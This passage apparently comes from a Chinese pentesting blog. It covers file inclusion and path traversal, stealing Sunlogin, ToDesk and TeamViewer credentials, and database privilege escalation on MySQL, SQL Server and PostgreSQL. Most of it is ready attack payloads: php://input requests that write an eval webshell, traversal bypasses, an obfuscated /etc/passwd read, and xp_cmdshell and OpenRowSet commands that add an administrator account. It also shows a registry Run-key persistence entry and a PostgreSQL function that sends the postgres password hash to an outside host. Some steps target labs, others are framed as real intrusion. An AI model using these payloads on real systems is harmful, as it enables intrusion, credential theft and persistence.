deflate, br Connection: close Referer: http://challenge-064b3e5b3e558d07.sandbox.ctfhub.com:10800/ Priority: u=6 将读取的文件以base64输出\n3.php://input 可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。\n用法：?file=php://input 数据利用POST传过去。\n写入木马 测试代码：\nphp配置文件中需同时开启 allow_**url_fopen 和 allow__url__include（PHP \u0026lt; 5.3.0）****,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。**\n如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。\n1 2 3 4 5 6 7 8 9 10 11 12 13 POST /index.php?file=php://input HTTP/1.1 Host: challenge-aab2e1dd6d7a0f74.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Type: application/x-www-form-urlencoded Content-Length: 24 \u0026lt;?php system (\u0026#34;ls /\u0026#34;)?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST /index.php?file=php://input HTTP/1.1 Host: challenge-aab2e1dd6d7a0f74.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Type: application/x-www-form-urlencoded Content-Length: 68 \u0026lt;?PHP fputs(fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php @eval($_POST[cmd])?\u0026gt;\u0026#39;);?\u0026gt; 利用input协议写入webshell Burp靶场路径遍历 1.文件路径遍历，非递归剥离的遍历序列 题目描述：\n现在不能直接读取文件，靶场会自定过滤掉../,但是只会过滤一次，只需要双写即可绕过\n1 https://c2f3a2008a0058.web-security.net/image?filename=....//....//....//etc/passwd 2.用多余的 URL 解码剥离的遍历序列 注意：需要进行两次url编码，但是burp的url编码存在问题，编码出来的与在线网址结果不同\n漏洞描述\n1 2 3 4 5 6 7 8 9 10 11 12 13 GET /image?filename=..%252F..%252F..%252Fetc%252Fpasswd HTTP/2 Host: 0ac800b00436f0ff80cae9d300a200f9.web-security-academy.net Cookie: session=Nr4ZTtKbHNx4cF6JPCRAFY90zfXaXMow User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0ac800b00436f0ff80cae9d300a200f9.web-security-academy.net/product?productId=1 Sec-Fetch-Dest: image Sec-Fetch-Mode: no-cors Sec-Fetch-Site: same-origin Priority: u=5 Te: trailers 3.文件路径遍历，验证路径的开头 漏洞描述\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2 Host: 0a01001f042da0db805767c800830043.web-security-academy.net Cookie: session=wb7Ya57vJr1D4q8r1pg3GGZnpSqlAttu User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a01001f042da0db805767c800830043.web-security-academy.net/ Sec-Fetch-Dest: image Sec-Fetch-Mode: no-cors Sec-Fetch-Site: same-origin Priority: u=5 Te: trailers 解题思路：使用../回退到根目录，在进行读取 4.文件路径遍历，使用空字节绕过验证文件扩展名 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 GET /image?filename=../../../etc/passwd%00.jpg HTTP/2 Host: 0a6000bc043a623780061255002a0067.web-security-academy.net Cookie: session=LdB00xgMXgVmyX37C1NXazmbwVdMoHN8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a6000bc043a623780061255002a0067.web-security-academy.net/product?productId=1 Sec-Fetch-Dest: image Sec-Fetch-Mode: no-cors Sec-Fetch-Site: same-origin Priority: u=5, i Te: trailers 使用空字节%00进行绕过 CTF中的文件包含 [SWPUCTF 2021 新生赛]include 考点：php伪协议利用，直接读取flag.php无法读取，只需要base64编码即可读取\n[HNCTF 2022 WEEK2]easy_include [HNCTF 2022 WEEK2]easy_include_ctfeasyinclude 2024-CSDN博客\n包含日志文件实现getshell\n文件包含Bypass 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 url编码代替.或者/，如使用%2F代替/ ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd 二次编码(%25) ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd 加入+ ?filename=.+./.+./bin/redacted.dll %00 ?filename=.%00./file.php /etc/passwd%00.jpg \\ ?filename=..%5c..%5c/windows/win.ini Java %c0%ae 安全模式绕过 ?filename=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd e\\c\\h\\o$IFS-e$IFS\u0026#39;\\x63\\x61\\x74\\x20\\x2F\\x65\\x74\\x63\\x2F\\x70\\x61\\x73\\x73\\x77\\x64\u0026#39;|/???/\\b**\\h 读取/etc/passwd ../\\/\\/\\ 实战中文件读取后利用 文件读取漏洞实战利用\nChrome 任意文件读取 Google Chrome 任意文件读取 (CVE-2023-4357)漏洞-CSDN博客\n1 2 访问你的网页 判断对应的UA头是否符合漏洞版本 Java文件读取/下载操作方式 方法一：使用java.nio.file.Files读取文本 使用 Files 类将文件的所有内容读入字节数组。 Files 类还有一个方法可以读取所有行到字符串列表。 Files 类是在Java 7****中引入的，如果想加载所有文件内容，使用这个类是比较适合的。只有在处理小文 件并且需要加载所有文件内容到内存中时才应使用此方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.io.IOException; import java.nio.charset.StandardCharsets; import java.nio.file.Files; import java.nio.file.Path; import java.nio.file.Paths; import java.util.List; public class ReadFiles { public static void main(String[] args) throws IOException { String fileName = \u0026#34;C:\\\\Users\\\\24767\\\\Desktop\\\\url.txt\u0026#34;; //使用Java 7中的Files类处理小文件，获取完整的文件数据 readUsingFiles(fileName); } private static void readUsingFiles(String fileName) throws IOException { Path path = Paths.get(fileName); System.out.println(\u0026#34;使用File类字节数组读取文件.........\u0026#34;); //将文件读取到字节数组 byte[] bytes = Files.readAllBytes(path); System.out.println(new String(bytes, StandardCharsets.UTF_8)); System.out.println(\u0026#34;使用File类字读取文件字符串列表.........\u0026#34;); @SuppressWarnings(\u0026#34;unused\u0026#34;) List\u0026lt;String\u0026gt; allLines = Files.readAllLines(path, StandardCharsets.ISO_8859_1); System.out.println(allLines); } } 方法二：使用java.io.FileReader类读取文本 可以使用 FileReader 获取 BufferedReader ，然后逐行读取文件。 FileReader 不支持编码并使用系统 默认编码，因此它不是一种java中读取文本文件的非常有效的方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 package com.example.demo; import org.apache.commons.io.FileUtils; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.ResponseBody; import javax.servlet.http.HttpServletResponse; import java.io.*; import java.net.URLEncoder; import java.nio.charset.StandardCharsets; import java.nio.file.Files; import java.nio.file.Path; import java.nio.file.Paths; import java.util.List; import java.util.Scanner; @Controller @ResponseBody public class ReadFilesController { @RequestMapping(\u0026#34;/readUsingFiles\u0026#34;) public String readUsingFiles(String fileName, HttpServletResponse response) throws IOException { //使用Java 7中的Files类处理小文件，获取完整的文件数据 Path path = Paths.get(fileName); //将文件读取到字节数组 byte[] bytes = Files.readAllBytes(path); System.out.println(\u0026#34;使用File类读取文件.........\u0026#34;); @SuppressWarnings(\u0026#34;unused\u0026#34;) List\u0026lt;String\u0026gt; allLines = Files.readAllLines(path, StandardCharsets.UTF_8); //将注释去掉，重新运行启动项目，在浏览器键入要读取的文件地址，观察下效果有什么不一样。 response.reset(); response.setContentType(\u0026#34;application/octet-stream\u0026#34;); response.addHeader(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment; filename=\u0026#34; + URLEncoder.encode(fileName, \u0026#34;UTF-8\u0026#34;)); System.out.println(new String(bytes)); return new String(bytes); } @RequestMapping(\u0026#34;/readUsingFileReader\u0026#34;) public void readUsingFileReader(String fileName, HttpServletResponse response) throws IOException { //使用FileReader读取，没有编码支持，效率不高 File file = new File(fileName); FileReader fr = new FileReader(file); BufferedReader br = new BufferedReader(fr); String line; System.out.println(\u0026#34;使用FileReader读取文本文件......\u0026#34;); //将注释去掉，重新运行启动项目，在浏览器键入要读取的文件地址，观察下效果有什么不一样。 //response.reset(); //response.setContentType(\u0026#34;application/octet-stream\u0026#34;); //response.addHeader(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment; filename=\u0026#34; + URLEncoder.encode(fileName, \u0026#34;UTF-8\u0026#34;)); PrintWriter out = response.getWriter(); while ((line = br.readLine()) != null) { //逐行读取 System.out.println(line); out.print(line); } br.close(); fr.close(); } @RequestMapping(\u0026#34;/ReadBufferedReader\u0026#34;) public void readBufferedReader(String fileName, HttpServletResponse response) throws IOException{ File file = new File(fileName); FileInputStream fis = new FileInputStream(file); InputStreamReader isr = new InputStreamReader(fis, StandardCharsets.UTF_8); BufferedReader br = new BufferedReader(isr); String line; //将注释去掉，重新运行启动项目，在浏览器键入要读取的文件地址，观察下效果有什么不一样。 //response.reset(); //response.setContentType(\u0026#34;application/octet-stream\u0026#34;); //response.addHeader(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment; filename=\u0026#34; + URLEncoder.encode(fileName, \u0026#34;UTF-8\u0026#34;)); PrintWriter out = response.getWriter(); System.out.println(\u0026#34;使用BufferedReader读取文本文件......\u0026#34;); while((line = br.readLine()) != null){ //逐行读取 System.out.println(line); out.print(line); } br.close(); } @RequestMapping(\u0026#34;/readScanner\u0026#34;) public void readScanner(String fileName, HttpServletResponse response) throws IOException{ Path path = Paths.get(fileName); Scanner scanner = new Scanner(path); System.out.println(\u0026#34;使用Scanner读取文本文件.....\u0026#34;); //将注释去掉，重新运行启动项目，在浏览器键入要读取的文件地址，观察下效果有什么不一样。 //response.reset(); //response.setContentType(\u0026#34;application/octet-stream\u0026#34;); //response.addHeader(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment; filename=\u0026#34; + URLEncoder.encode(fileName, \u0026#34;UTF-8\u0026#34;)); PrintWriter out = response.getWriter(); //逐行读取 while(scanner.hasNextLine()){ //逐行处理 String line = scanner.nextLine(); System.out.println(line); out.print(line); } scanner.close(); } @RequestMapping(\u0026#34;/readUsingRandomAccessFile\u0026#34;) public void readUsingRandomAccessFile(String fileName, HttpServletResponse response) throws IOException{ RandomAccessFile file = new RandomAccessFile(fileName, \u0026#34;r\u0026#34;); String str; //将注释去掉，重新运行启动项目，在浏览器键入要读取的文件地址，观察下效果有什么不一样。 //response.reset(); //response.setContentType(\u0026#34;application/octet-stream\u0026#34;); //response.addHeader(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment; filename=\u0026#34; + URLEncoder.encode(fileName, \u0026#34;UTF-8\u0026#34;)); PrintWriter out = response.getWriter(); while ((str = file.readLine()) != null) { System.out.println(\u0026#34;使用RandomAccessFile来实现断点续传读取/下载文件......\u0026#34;); System.out.println(str); out.print(str); } file.close(); } @RequestMapping(\u0026#34;/readUsingCommonsIo\u0026#34;) public String readUsingCommonsIo(String fileName,HttpServletResponse response) throws IOException{ File file = new File(fileName); //将注释去掉，重新运行启动项目，在浏览器键入要读取的文件地址，观察下效果有什么不一样。 response.reset(); response.setContentType(\u0026#34;application/octet-stream\u0026#34;); response.addHeader(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment; filename=\u0026#34; + URLEncoder.encode(fileName, \u0026#34;UTF-8\u0026#34;)); System.out.println(\u0026#34;使用Commons-io读取文件......\u0026#34;); System.out.println(FileUtils.readFileToString(file, StandardCharsets.UTF_8)); return FileUtils.readFileToString(file, StandardCharsets.UTF_8); } } ","date":"2025-06-16T23:28:03+08:00","image":"https://lserein.github.io/p/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%B1%BB%E6%BC%8F%E6%B4%9E/file_hu_e9ce81ae20862dcf.jpeg","permalink":"https://lserein.github.io/p/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%B1%BB%E6%BC%8F%E6%B4%9E/","title":"任意文件操作类漏洞"},{"content":"内网渗透｜内网远程控制总结\n1.向日葵 https://mp.weixin.qq.com/s/yfKpdPaDl0XwoZWLdY4S8Q\n在一些内网实战中，有可能存在向日葵远控软件，使用进程杀软识别可以识别出向日葵的进程。\n向日葵使用伙伴识别码和验证码就可以直接远程控制，设备的识别码和验证码都保存在本地配置文件中。\n影响版本：向日葵个人版for Windows= 11.0.0.33 向日葵简约版= V1.0.1.43315（2021.12） 测试客户端漏洞版本:11.0.0.33162\n查看是否存在向日葵进程\n1 2 3 tasklist |findstr \u0026#34;Sunlogin\u0026#34; SunloginClient.exe就是向日葵进程信息 1.1.向日葵RCE 受影响版本向日葵下载地址：http://www.kkx.net/soft/42661.html\nhttps://github.com/Mr-xn/sunlogin_rce\n1 2 3 .\\xrkRce.exe -h 192.168.0.100 -t scan xrkRce.exe -h 192.168.0.100 -t rce -p 53123 -c \u0026#34;whoami\u0026#34; //执行命令 1.2.内网向日葵\u0026lt;12.5通杀思路 窃取配置文件来进行解密（只针对低版本向日葵具体版本号未知） 低版本的向日葵把密码和机器码加密写入到了配置文件中，我们可以把配置文件down到自己的机器上，然后进行重开向日葵即可。这里向日葵版本较低，就不进行测试\n在12.5.2之前的某些版本可以写到了注册表中，所以可以使用注册表来进行查询 1 2 3 4 5 6 向日葵默认配置文件路径: 安装版：C:\\\\\\\\Program Files\\\\\\\\Oray\\\\\\\\SunLogin\\\\\\\\SunloginClient\\\\\\\\config.ini 便携版：C:\\\\\\\\ProgramData\\\\\\\\Oray\\\\\\\\SunloginClient\\\\\\\\config.ini 本机验证码参数：encry\\\\\\_pwd 本机识别码参数：fastcode(去掉开头字母) sunlogincode：判断用户是否登录状态 解密脚本：https://github.com/wafinfo/Sunflower_get_Password?ref=pythonrepo.com\n如果配置文件中不存在密文，那么可能存放在注册表中\n1 2 3 安装版：reg query HKEY_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginInfo 便携版（绿色版）：reg query HKEY_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginGreenInfo 最新版本 首先找到向日葵用户进程，然后使用**\u0026lt;font style=\u0026quot;color:rgb(53, 148, 247);background-color:rgba(59, 170, 250, 0.1);\u0026quot;\u0026gt;procdump\u0026lt;/font\u0026gt;**等工具转储进程内存。\n1 2 tasklist /v | findstr /i sunlogin procdump64.exe -accepteula -ma 进程号 使用Winhex打开转储文件，按下Ctrl+Alt+X快捷键打开十六进制值搜索功能，搜索十六进制值66617374636F646522203A20226b，即可找到本机识别码。\n搜索十六进制值000000000000003C6620663D79616865692E626F6C642E323420633D 636F6C6F725F65646974203E，使用F3快捷键可以跳到下一个匹配处，多跳2次即可找到本机验证码。\n2.TeamViewer 查看进程中是否存在TeamViewer\n1 tasklist |findstr \u0026#34;TeamViewer\u0026#34; 利用工具：https://github.com/uknowsec/SharpDecryptPwd\n1 SharpDecryptPWD.exe -TeamViewer Teamviewer版本高于版本为15.18.5无法正常利用\n3.Todesk 这里还是和前面的向日葵一样，可以进行配置文件的窃取，默认安装路径C:\\Program Files\\ToDesk\\config.ini\n1 2 //获取todesk安装路径 wmic process where name=\u0026#34;ToDesk.exe\u0026#34; get processid,executablepath,name 这里咱们可以攻击机安装todesk，然后读取到config.ini中的配置文件，然后和攻击机进行替换即可。\n这里我虚拟机假装是受害机，读取出来，然后攻击机把tempauthpassex进行替换。\n当服务器未安装todesk时，我们也可以上传todesk安装包，通过webshell进行静默安装\n1 Todesk.exe /S 接下载的思路也是将靶机的tempAuthPassEX复制到攻击机config.ini，重启todesk\n4.AnyDesk AnyDesk在国外常用\n查看主机是否存在AnyDesk\n1 tasklist |findstr \u0026#34;Anydesk.exe\u0026#34; 1 2 AnyDesk默认安装路径： C:\\\\Users\\\\用户名\\\\AppData\\\\Roaming\\\\AnyDesk 5.gotohttp 6.内网密码收集工具 https://github.com/uknowsec/SharpDecryptPwd\nhttps://github.com/RowTeam/SharpDecryptPwd\n6.1.SharpDecryptPwd 1 2 3 4 5 Usage: SharpDecryptPwd.exe -NavicatCrypto SharpDecryptPwd.exe -TeamViewer SharpDecryptPwd.exe -FileZilla SharpDecryptPwd.exe -WinSCP SharpDecryptPwd.exe -Xmangager -p Session_Path 1 SharpDecryptPwd.exe -NavicatCrypto //解密Navicat密码 1 SharpDecryptPwd.exe -TeamViewer //解密TeamViewer ","date":"2025-06-15T20:32:46+08:00","image":"https://lserein.github.io/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/logo_hu_c1a2760d8129b6e3.png","permalink":"https://lserein.github.io/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/","title":"内网远控工具利用思路"},{"content":"数据库提权 https://mp.weixin.qq.com/s/saTKb2YiAeLEvN94weIKZw\nhttps://www.freebuf.com/articles/web/264790.html\nhttps://mp.weixin.qq.com/s/ntyKMxaNZB1kexAwWleh8g\nMysql数据库提权 在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，除 Access 数据库外，其他数据库基本都存在数据库提权的可能。当然这里也是主要介绍MySQL数据库的提权\nMysql数据库前提条件 1 2 3 4 5 root权限 secure_file_priv不为Null 网站目录可写 知道网站路径 知道数据库账号密码（SQL注入获取账号密码，网站备份文件或配置文件，爆破） 如在PHPstudy中mysql安装目录下的user.MYD文件下存储着管理员密码\nWindows下-UDF提权 udf(user-defined-function)是mysql得一个拓展接口，也称为用户自定义函数，用户通过自定义函数来实现在mysql中无法方便实现得功能当攻击者已知root账号和密码，就可以利用root权限，创建带有调用cmd函数的“udf.dll”。当我们把udf.dll导出指定文件夹引入mysql时候，其中的调用函数拿出来当作mysql函数来使用\nMySQL版本小于5.1的时候，windows2003的udf.dll文件放置在：c:\\windows\\system32。windows2000的udf.dll文件放置在：c:\\winnt\\system32。 MySQL版本大于5.1的时候，udf.dll文件必须放置在MySQL安装目录下的lib\\plugin，但是大于5.1版本的时候没有plugin这个文件夹，需要自己创建 设置数据库Root外联 Mysql数据库中默认root用户权限都不可以外联，需要在连接上后通过执行命令来添加外部联权限\n这里看一下外连数据库情况，可以看到这里是无法连接的，原因就是root未开启外联\n通过Webshell外联数据库，这里通过哥斯拉的数据库管理进行外联，也可以使用php大马进行连接\n1 2 3 //开启数据库root外联 GRANT ALL PRIVILEGES ON *.* TO \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;root\u0026#39; WITH GRANT OPTION; GRANT ALL ON *.* TO \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;root\u0026#39; WITH GRANT OPTION; 提权 1 2 select version(); #获取数据库版本信息，通过获取数据的版本来确定后面将dll导出的位置 select @@basedir ##获取数据库安装位置 查看到Mysql安装路径，到路径下查看是否存在plugin文件夹，没有则手动创建一个\n当secure-file-priv为NULL的时候，直接就放弃吧，不要提权了，这里其实是可以提权的，但是最关键的是需要动数据库的配置，以及重启数据库，这个肯定会使得别人数据库产生问题\n1 show global variables like \u0026#39;%secure%\u0026#39;; 查看secure_file_priv状态 使用MSF的Mysql UDF提权模块\n1 2 3 4 5 use exploit/multi/mysql/mysql_udf_payload show options set username root set rhost 192.168.x.x set password root 这里直接无法攻击成功，由于secure_file_priv为Null\n修改secure_file_priv的值，必须要重启数据库\nwindows下：修改my.ini 在[mysqld]内加入secure_file_priv = linux下：修改my.cnf 在[mysqld]内加入secure_file_priv = 1 2 此时攻击成功，查询dll文件 select * from mysql.func 之前提到的，是没有这个函数的，默认的是无回显的，所以可以手动创建一个有回显的函数，这里一定要和你的dll文件名称是一致的，这里我的是CxyZMFgd.dll，不代表你的也是这个，所以命令复制的时候需要修改一下后面的这个dll文件的名称\n1 2 create function sys_eval returns string soname \u0026#34;uKoEaaGi.dll\u0026#34;; ##创建函数 drop function sys_eval; ##删除函数，这里是为了执行完后，方便删除记录。 1 select sys_eval(\u0026#39;whoami\u0026#39;); MOF提权 现在通过mof文件来进行提权已经非常困难了，因为它支持提权版本只有2003和一些之前的版本。mof的提权原理为mof文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。\n1 use exploit/windows/mysql/mysql_mof //使用MSF自带的mof提权模块 mysql启动项提权 就是写一个木马到Windows启动项目录下，需要配合服务器重启才能成功，前提需要开启root用户外联\n1 2 3 4 use exploit/windows/mysql/mysql_start_up //使用MSF自带的mof提权模块 set rhost set username set password SqlServer提权 https://blog.csdn.net/zhzx123aa/article/details/146362888\nhttps://www.cnblogs.com/suv789/p/18700276\nhttps://www.cnblogs.com/hellobao/articles/17249842.html\nXP_cmdshell提权 原理：xp_cmdshell可以让系统管理员以操作cmd的方式执行给定的命令，并以文本方式返回输出，是一个功能非常强大的扩展存储过程。xp_cmdshell在SQLserver2000中默认开启，可以直接执行系统命令。2005本身及之后的版本默认禁止，所以想要使用，就需要拥有SA账号相应权限，使用sp_configure将其开启。\n利用条件：\n拿到sqlserver数据库sa权限 sqlserver服务未降权 1 2 3 4 5 6 7 8 //xp_cmdshell在sqlserver高版本中是默认禁用的，下面是开启命令 EXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1; RECONFIGURE; EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1; RECONFIGURE; EXEC xp_cmdshell \u0026#39;whoami\u0026#39;; //利用xp_cmdshell执行系统命令 sp_oacreate提权 sp_oacreate用于创建OLE自动化对象实例，搭配sp_oamethod可以调用系统组件（如WScript.Shell）执行命令。\n使用前提：需要SA权限，默认情况下此功能可用。\n1 2 3 4 DECLARE @shell INT; EXEC sp_oacreate \u0026#39;WScript.Shell\u0026#39;, @shell OUTPUT; EXEC sp_oamethod @shell, \u0026#39;Run\u0026#39;, NULL, \u0026#39;cmd.exe /c whoami \u0026gt; C:\\result.txt\u0026#39;; EXEC sp_oadestroy @shell; 沙盒提权xp_regwrite 功能：xp_regwrite允许修改Windows注册表。 提权用途：通过更改注册表，攻击者可以启用禁用功能、添加启动项或修改系统配置以实现提权。 使用前提：需要SA权限。 1 2 3 EXEC xp_regwrite @rootkey=\u0026#39;HKEY_LOCAL_MACHINE\u0026#39;, @key=\u0026#39;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#39;, @value_name=\u0026#39;Test\u0026#39;, @type=\u0026#39;REG_SZ\u0026#39;, @value=\u0026#39;C:\\malicious.exe\u0026#39;; EXEC master.dbo.xp_regwrite \u0026#39;HKEY_LOCAL_MACHINE\u0026#39;,\u0026#39;SoftWare\\Microsoft\\Jet\\4.0\\Engines\u0026#39;,\u0026#39;SandBoxMode\u0026#39;,\u0026#39;REG_DWORD\u0026#39;,0 然后利用sql语句添加一个帐号和密码都为sql$的帐号，同时加入管理员组进行提权：\n创建账户+添加到管理员组：\n1 2 Select * From OpenRowSet(\u0026#39;Microsoft.Jet.OLEDB.4.0\u0026#39;,\u0026#39;;Database=c:\\windows\\system32\\ias\\ias.mdb\u0026#39;,\u0026#39;select shell(\u0026#34;net user sql$ 123 /add\u0026#34;)\u0026#39;); Select * From OpenRowSet(\u0026#39;Microsoft.Jet.OLEDB.4.0\u0026#39;,\u0026#39;;Database=c:\\windows\\system32\\ias\\ias.mdb\u0026#39;,\u0026#39;select shell(\u0026#34;net localgroup administrators sql$ /add\u0026#34;)\u0026#39;); Oracle数据库提权 https://mp.weixin.qq.com/s/yOe9VtbV4Hw4NZyj95YPDA\nhttps://www.shuzhiduo.com/A/pRdBPVMaJn/\nOracle数据库有3种提权模式，普通模式/DBA模式/注入模式，可以直接使用脚本一把梭\nPostgreSQL数据库提权 https://mp.weixin.qq.com/s/6wPc5eJACcmhVZ-yFMxrYA\n1 \u0026#34;PostgreSQL\u0026#34; CVE-2018-1058 PostgreSQL 是一个功能强大的开源关系型数据库系统。在9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下可能执行普通用户创建的恶意代码，从而造成意外的操作。\nNavicat连接数据库vulhub:vulhub\n1 2 3 4 CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$ select dblink_connect((select \u0026#39;hostaddr=192.168.139.41 port=5433 user=postgres password=chybeta sslmode=disable dbname=\u0026#39;||(SELECT passwd FROM pg_shadow WHERE usename=\u0026#39;postgres\u0026#39;))); SELECT pg_catalog.array_to_string($1,$2); $$ LANGUAGE SQL VOLATILE; 在靶机中执行\n1 2 3 docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub 即可导出vulhub用户的hash CVE-2019-9193 影响版本：PostgreSQL v9.3-v11\n使用postgres:postgres默认密码连接数据库\n1 2 //执行以下命令 DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM \u0026#39;id\u0026#39;;SELECT * FROM cmd_exec; 数据库利用工具 MDUT 下载地址：https://github.com/SafeGroceryStore/MDUT\n使用指南：MDUT\nMysql UDF提权 PostgreSQL只支持CVE-2019-9193提权 OracleShell\u0026mdash;Oracle数据库命令执行工具 下载地址：https://github.com/jas502n/oracleShell\nDatabaseTools 下载地址：https://github.com/Hel10-Web/Databasetools\nMysql 1 2 3 4 DatabaseTools_windows_amd64.exe -h //命令行工具，不是图形化工具 //获取SQL Shell DatabaseTools_windows_amd64.exe -mysql -ruser root -rhost 192.168.139.148 -pwd \u0026#34;root\u0026#34; -rport 3306 -cli into out file获取webshell 1 DatabaseTools_windows_amd64.exe -mysql -ruser root -rhost 192.168.139.148 -pwd \u0026#34;root\u0026#34; -rport 3306 -shell -outfileshell -path \u0026#34;C:\\\\\\\\phpStudy\\\\\\\\WWW\\\\\\\\\\aaa.php\u0026#34; 全局日志getshell 1 DatabaseTools_windows_amd64.exe -mysql -ruser root -rhost 192.168.139.148 -pwd \u0026#34;root\u0026#34; -rport 3306 -shell -generallog -path C:\\\\\\\\phpStudy\\\\\\\\WWW\\\\\\\\aam.php udf提权 1 DatabaseTools_windows_amd64.exe -mysql -ruser root -rhost 192.168.139.148 -pwd \u0026#34;root\u0026#34; -rport 3306 -udf PostgreSQL 连接postgre数据库获取sql shell 1 DatabaseTools_windows_amd64.exe -postgre -ruser \u0026#34;postgres\u0026#34; -pwd \u0026#34;postgres\u0026#34; -rhost 192.168.111.162 -rport \u0026#34;5432\u0026#34; -cli 利用CVE-2019-9193循环执行命令 1 2 3 DatabaseTools_windows_amd64.exe -postgre -ruser \u0026#34;postgres\u0026#34; -pwd \u0026#34;postgres\u0026#34; -rhost 192.168.111.139 -rport \u0026#34;5432\u0026#34; -CVE20199193 -console 读取文件 DatabaseTools_windows_amd64.exe -postgre -ruser \u0026#34;postgres\u0026#34; -pwd \u0026#34;postgres\u0026#34; -rhost 192.168.111.139 -rport \u0026#34;5432\u0026#34; -read1 -file \u0026#34;/etc/passwd\u0026#34; 